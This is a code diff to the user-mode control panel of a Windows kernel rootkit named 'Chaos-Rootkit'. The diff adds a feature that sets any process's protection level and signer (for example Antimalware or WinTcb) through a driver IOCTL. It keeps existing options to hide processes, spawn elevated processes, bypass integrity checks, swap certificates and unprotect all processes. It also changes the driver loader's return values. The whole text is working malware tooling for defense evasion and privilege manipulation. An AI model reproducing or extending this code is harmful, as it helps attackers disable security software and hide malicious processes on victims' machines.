@@ -142,6 +142,8 @@ Texture readTextureFile()
 #define BYPASS_INTEGRITY_FILE_CTL               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x170, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define ZWSWAPCERT_CTL                          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x171, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+#define CR_SET_PROTECTION_LEVEL_CTL             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x172, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
 // Fixed type definitions
 #define STATUS_ALREADY_EXISTS ((DWORD)0xB7)
 #define ERROR_UNSUPPORTED_OFFSET ((DWORD)0x00000233)
@@ -152,7 +154,7 @@ BOOL loadDriver(char* driverPath) {
     hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCM == NULL)
     {
-        return (1);
+        return (0);
     }
     const char* g_serviceName = "Chaos-Rootkit";
 
@@ -166,7 +168,7 @@ BOOL loadDriver(char* driverPath) {
             CloseServiceHandle(hService);
             CloseServiceHandle(hSCM);
             printf("Unable to Query Service Status\n");
-            return (1);
+            return (0);
         }
 
         if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
@@ -174,7 +176,7 @@ BOOL loadDriver(char* driverPath) {
                 printf("Unable to Start Service \n");
                 CloseServiceHandle(hService);
                 CloseServiceHandle(hSCM);
-                return (1);
+                return (0);
             }
             printf("Starting service...\n");
         }
@@ -187,7 +189,7 @@ BOOL loadDriver(char* driverPath) {
 
         CloseServiceHandle(hService);
         CloseServiceHandle(hSCM);
-        return (0);
+        return (1);
     }
 
     hService = CreateServiceA(hSCM, g_serviceName, g_serviceName, SERVICE_ALL_ACCESS,
@@ -197,7 +199,7 @@ BOOL loadDriver(char* driverPath) {
 
     if (hService == NULL) {
         CloseServiceHandle(hSCM);
-        return (1);
+        return (0);
     }
 
     printf("Service created successfully.\n");
@@ -206,7 +208,7 @@ BOOL loadDriver(char* driverPath) {
 
         CloseServiceHandle(hService);
         CloseServiceHandle(hSCM);
-        return (1);
+        return (0);
     }
 
     printf("Starting service...\n");
@@ -214,7 +216,7 @@ BOOL loadDriver(char* driverPath) {
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCM);
 
-    return (0);
+    return (1);
 }
 
 
@@ -223,6 +225,24 @@ typedef struct foperationx {
     wchar_t filename[MAX_PATH];
 } fopera, * Pfoperation;
 
+typedef struct _PS_PROTECTION
+{
+    union
+    {
+        UCHAR Level;
+        struct
+        {
+            UCHAR Type : 3;
+            UCHAR Audit : 1;
+            UCHAR Signer : 4;
+        };
+    };
+} PS_PROTECTION, * PPS_PROTECTION;
+
+typedef struct _CR_SET_PROTECTION_LEVEL {
+    PS_PROTECTION Protection;
+    HANDLE Process;
+} CR_SET_PROTECTION_LEVEL, * PCR_SET_PROTECTION_LEVEL;
 
 struct UIState {
     int elev_state = 0;
@@ -317,9 +337,15 @@ int main(int, char**)
     ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
     Texture tex = readTextureFile();
     int check_off = 0;
+    int protectionType = 0;
+    int protectionSigner = 0;
+    CR_SET_PROTECTION_LEVEL setProtectionCmd = {0};
 
     // FIXED: Add UI state management
     UIState ui_state;
+
+    const char* protectionTypeItems[] = {"None", "Light", "Full"};
+    const char* protectionSignerItems[] = {"None", "Authenticode", "CodeGen", "Antimalware", "Lsa", "Windows", "WinTcb", "WinSystem", "App"};
 
     OSVERSIONINFOEX versionInfo;
     ZeroMemory(&versionInfo, sizeof(OSVERSIONINFOEX));
@@ -417,7 +443,7 @@ int main(int, char**)
                 ImGui::Checkbox("Hide Process", &hide_specific_process);
                 ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
                 ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
-                ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
+                ImGui::Checkbox("Change Process Protection", &unprotect_all_processes);
                 ImGui::PopItemFlag();
                 ImGui::PopStyleColor();
             }
@@ -425,7 +451,7 @@ int main(int, char**)
                 ImGui::Checkbox("Hide Process", &hide_specific_process);
                 ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
                 ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
-                ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
+                ImGui::Checkbox("Change Process Protection", &unprotect_all_processes);
             }
 
             ImGui::Checkbox("Restrict Access To File", &restrict_access_to_file);
@@ -562,9 +588,35 @@ int main(int, char**)
 
         if (unprotect_all_processes) {
             ImGui::SetNextWindowSize(ImVec2(300, 300), ImGuiCond_FirstUseEver);
-            ImGui::Begin("UNPROTECT_ALL_PROCESSES", &unprotect_all_processes);
+            ImGui::Begin("Change Process Protection Level", &unprotect_all_processes);
 
-            if (ImGui::Button("UNPROTECT ALL PROCESSES")) {
+            ImGui::InputInt("Process Id", (PINT32)&setProtectionCmd.Process);
+            ImGui::Combo("Level", (PINT32)&protectionType, protectionTypeItems, IM_ARRAYSIZE(protectionTypeItems));
+            ImGui::Combo("Signer", (PINT32)&protectionSigner, protectionSignerItems, IM_ARRAYSIZE(protectionSignerItems));
+           
+            if (ImGui::Button("Set Protection")) {
+                setProtectionCmd.Protection.Type = protectionType;
+                setProtectionCmd.Protection.Signer = protectionSigner;
+
+                if (hdevice != INVALID_HANDLE_VALUE) {
+                    DWORD bytesReturned = 0;
+                    if (DeviceIoControl(hdevice, CR_SET_PROTECTION_LEVEL_CTL, &setProtectionCmd, sizeof(setProtectionCmd),
+                        NULL, NULL, NULL, NULL)) {
+                        ui_state.unprotect_state = 2; // Success
+                        ui_state.unprotect_timer = ui_state.MESSAGE_TIME;
+                    }
+                    else {
+                        ui_state.unprotect_state = 1; // Error
+                        ui_state.unprotect_timer = ui_state.MESSAGE_TIME;
+                        lpBytesReturned = GetLastError();
+                    }
+                }
+                else {
+                    ui_state.unprotect_state = 1; // Error
+                    ui_state.unprotect_timer = ui_state.MESSAGE_TIME;
+                }
+            }
+            if (ImGui::Button("UNPROTECT ALL")) {
                 if (hdevice != INVALID_HANDLE_VALUE) {
                     DWORD bytesReturned = 0;
                     if (DeviceIoControl(hdevice, UNPROTECT_ALL_PROCESSES, NULL, 0,
@@ -583,7 +635,6 @@ int main(int, char**)
                     ui_state.unprotect_timer = ui_state.MESSAGE_TIME;
                 }
             }
-
             if (ui_state.unprotect_timer > 0.0f) {
                 ui_state.unprotect_timer -= io.DeltaTime;
 
